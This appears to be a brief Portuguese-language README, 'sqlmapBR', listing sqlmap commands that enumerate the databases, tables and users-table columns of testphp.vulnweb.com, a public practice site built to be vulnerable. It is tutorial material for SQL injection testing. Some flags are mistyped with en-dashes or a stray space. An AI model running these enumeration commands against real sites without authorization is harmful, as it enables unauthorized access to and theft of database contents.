# sqlmapBR

```
 _______ _______ _____   _______ _______ ______ 
|     __|       |     |_|   |   |   _   |   __ \
|__     |   -  _|       |       |       |    __/
|_______|_______|_______|__|_|__|___|___|___|   
                                                
 ______ ______                                  
|   __ \   __ \                                 
|   __ <      <                                 
|______/___|__| 
```                                
                                               

                                  


python3 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs


python3 sqlmap -u  http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs -D acuart –-tables


python3 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs -D acuart -T users –-columns



# Esse metodo é avançado
```
python3 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --level 2 -- risk 2 –-dbs -D acuart -T users –-columns
```
